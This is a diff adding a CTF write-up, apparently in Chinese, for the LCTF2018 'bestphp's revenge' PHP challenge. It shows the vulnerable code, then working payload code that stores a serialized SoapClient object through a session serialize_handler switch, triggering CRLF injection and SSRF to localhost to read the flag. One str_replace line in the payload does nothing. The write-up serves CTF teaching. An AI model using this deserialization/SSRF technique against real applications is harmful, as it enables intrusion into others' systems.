@@ -144,3 +144,78 @@ $aaa = str_replace('&','&',$aaa);
 echo urlencode($aaa);
 ```
 
+## 题目
+
+### [Lctf2018 bestphp's revenge]
+
+**index.php**
+
+```php
+<?php
+highlight_file(__FILE__);
+$b = 'implode';
+call_user_func($_GET['f'], $_POST);
+session_start();
+if (isset($_GET['name'])) {
+    $_SESSION['name'] = $_GET['name'];
+}
+var_dump($_SESSION);
+$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
+call_user_func($b, $a);
+?>
+```
+
+**flag.php**
+
+```
+only localhost can get flag!session_start(); echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){ $_SESSION['flag'] = $flag; } only localhost can get flag!
+```
+
+很明显就是要**ssrf**来获取flag了
+
+`call_user_func($_GET['f'], $_POST);`最前面用了一个函数来对数组进行处理，能利用的函数不多
+
+本题用到的 `extract` 和`session_start` 
+
+先利用`session_start`将php session反序列化的方法改变，从而造成php反序列化
+
+```php
+session_start(['serialize_handler'=>'php_serialize'])
+```
+
+然后就是本题的一大关键，我们可以控制`$_SESSION`的值，也就是说程序运行完，我们`$_SESSION`中的**value**是会保存到`sess_PHPSESSID`中的，而当我们以该**PHPSESSID**再次访问时，是会对里面的内容**反序列化**的
+
+所以我们可以先构造一个打**CRLF**的**SoapClient**对象，然后下次重新访问的时候利用`call_user_func($b, $a);`来调用它的`__call`方法从而打**SSRF**
+
+首先构造**SoapClient**对象
+
+```php
+<?php
+$target = 'http://127.0.0.1/flag.php';
+$post_string = 'xlccccc';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=xlccccc'
+    );
+$b = new SoapClient(null,array('location' => $target,'user_agent'=>'xlccccc^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
+
+$aaa = serialize($b);
+$aaa = str_replace('^^',"\r\n",$aaa);
+$aaa = str_replace('&','&',$aaa);
+echo urlencode($aaa);
+```
+
+![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212301525756.png)
+
+这一步构造了一个**SoapClient**对象并存在了本地的`/tmp/sess_ml5te253j49m4es0r3jimm8fu4`中
+
+![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212301528469.png)
+
+这一步对刚才上传的**SoapClient**对象进行反序列化，得到了`object(SoapClient)`
+
+然后执行`call_user_func(array('SoapClient','welcome_to_the_lctf2018'))`，因为找不到`welcome_to_the_lctf2018`方法，所以调用`__call`方法从而触发**SSRF和CRLF**
+
+然后`http://127.0.0.1/flag.php`的结果就存在了你伪造的**PHPSESSID**中，即`xlccccc`，这时候以该**PHPSESSID**访问，由于他会打印出`$_SESSION`，你就可以看到**flag**了
+
+![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212301532381.png)
+
